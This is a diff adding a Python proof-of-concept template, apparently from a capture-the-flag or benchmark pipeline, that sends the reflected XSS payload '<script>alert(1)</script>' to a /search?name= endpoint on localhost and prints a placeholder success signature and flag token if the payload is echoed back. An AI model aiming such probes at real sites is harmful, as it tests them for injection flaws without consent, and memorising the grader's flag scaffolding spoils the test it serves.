@@ -1,0 +1,39 @@
+# Asset-backed family-aware fallback template for XSS.
+import argparse
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.parse import quote
+from urllib.request import urlopen
+
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_PAYLOAD = '<script>alert(1)</script>'
+
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + '/search?name=' + quote(payload)
+    try:
+        with urlopen(url, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[xss-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    return payload in body
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='XSS fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[xss-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+
+if __name__ == '__main__':
+    main()
